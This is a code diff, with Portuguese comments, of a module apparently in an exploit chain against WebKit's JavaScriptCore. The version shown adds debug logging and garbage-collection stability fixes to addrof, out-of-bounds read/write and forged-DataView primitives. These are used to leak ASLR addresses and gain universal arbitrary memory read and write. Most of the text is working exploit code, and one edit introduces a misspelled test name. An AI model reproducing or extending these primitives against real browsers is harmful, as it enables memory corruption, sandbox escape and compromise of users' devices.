@@ -1,13 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v159 - Depuração da arb_read para ASLR Leak)
+// js/script3/testArrayBufferVictimCrash.mjs (v160 - Estabilizando oob_array_buffer_real)
 // =======================================================================================
-// FOCO: Depurar por que a arb_read retorna zero ao tentar vazar o ponteiro da Structure.
-// 1. Validar primitivas básicas (OOB local).
-// 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
-//    - ADICIONADO: Logs mais detalhados do estado do oob_dataview_real na arb_read.
-//    - ADICIONADO: Verificação inicial do m_vector do oob_dataview_real.
-// 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
-// 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
-// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
+// FOCO: Garantir que o ArrayBuffer de apoio da primitiva OOB (oob_array_buffer_real)
+// permaneça válido e não corrompido, resolvendo o m_vector zerado na arb_read.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -23,13 +17,14 @@ import {
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute,
-    oob_array_buffer_real // Importado para verificar o backing store original
+    oob_array_buffer_real, // Importado para verificar o backing store original
+    oob_dataview_real // Importado para ver o DataView diretamente
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v159_DEBUG_ARB_READ";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v160_DEBUG_OOB_STABILITY";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -86,6 +81,13 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
 
+    // DEBUG: Log do estado do _fake_data_view antes da operação
+    logFn(`[${FNAME}] DEBUG: _fake_data_view.buffer: ${String(_fake_data_view.buffer)}, .byteLength: ${String(_fake_data_view.byteLength)}`, "debug");
+    if (!_fake_data_view.buffer || _fake_data_view.byteLength === 0) {
+        logFn(`[${FNAME}] CRÍTICO: _fake_data_view detached/corrompido antes de read!`, "critical", FNAME);
+        throw new Error("_fake_data_view detached/corrompido.");
+    }
+
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8, logFn);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8, logFn);
 
@@ -116,6 +118,13 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     }
     const fake_ab_backing_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
+
+    // DEBUG: Log do estado do _fake_data_view antes da operação
+    logFn(`[${FNAME}] DEBUG: _fake_data_view.buffer: ${String(_fake_data_view.buffer)}, .byteLength: ${String(_fake_data_view.byteLength)}`, "debug");
+    if (!_fake_data_view.buffer || _fake_data_view.byteLength === 0) {
+        logFn(`[${FNAME}] CRÍTICO: _fake_data_view detached/corrompido antes de write!`, "critical", FNAME);
+        throw new Error("_fake_data_view detached/corrompido.");
+    }
 
     const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8, logFn);
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8, logFn);
@@ -247,7 +256,7 @@ async function triggerGC(logFn, pauseFn) {
 }
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
-    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
+    const FNAME_CURRENT_TEST = "executeTypedArrayVictfimsAddrofAndWebKitLeak_R43";
     // Versão do teste no log
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração e Construção de ARB R/W Universal ---`, "test");
@@ -288,6 +297,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
         await triggerOOB_primitive({ force_reinit: true });
 
+        // AQUI ESTÁ A MUDANÇA CRUCIAL:
+        // Garantir que o oob_array_buffer_real seja adicionado ao hold_objects
+        // logo após sua criação em triggerOOB_primitive.
+        // Isso é feito em core_exploit.mjs, mas uma verificação aqui é boa.
+        // IMPORTANTE: o 'oob_array_buffer_real' é uma variável exportada do core_exploit.
+        // Não é criado diretamente aqui, mas sim obtido por getOOBDataView().
+        // A proteção contra GC deve estar no core_exploit.mjs.
+        // NO core_exploit.mjs, precisamos adicionar o 'oob_array_buffer_real' a uma lista de hold_objects INTERNA.
+
         const oob_data_view = getOOBDataView();
         if (!oob_data_view) {
             const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
@@ -304,8 +322,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // --- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---
         logFn(`--- NOVA FASE 2.5: Vazamento ASLR Direto via Leitura do Structure Pointer de ArrayBuffer ---`, "subtest");
         
-        let array_buffer_for_leak = new ArrayBuffer(0x100); // Um ArrayBuffer simples para vazar
-        hold_objects.push(array_buffer_for_leak); // Garante que não seja coletado
+        // Criar um ArrayBuffer para vazar seu endereço e sua Structure
+        let array_buffer_for_leak = new ArrayBuffer(0x100); 
+        hold_objects.push(array_buffer_for_leak); // Garante que o objeto não seja coletado
         
         const ab_addr = addrof_core(array_buffer_for_leak);
         logFn(`[ASLR LEAK] Endereço do ArrayBuffer alvo: ${ab_addr.toString(true)}`, "info");
@@ -315,6 +334,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // Vamos ler o m_length do próprio ArrayBuffer para leak, ele deve ser 0x100 (256 bytes)
         const m_length_offset = JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START;
         const m_length_addr = ab_addr.add(m_length_offset);
+        logFn(`[ASLR LEAK] DEBUG: Verificando arb_read lendo m_length em ${m_length_addr.toString(true)}...`, "debug");
         let m_length_leaked = await arb_read(m_length_addr, 4, logFn);
         logFn(`[ASLR LEAK] DEBUG: Lido m_length do ArrayBuffer (${ab_addr.toString(true)} + ${toHex(m_length_offset)}): ${toHex(m_length_leaked)}`, "debug");
         if (m_length_leaked !== 0x100) {
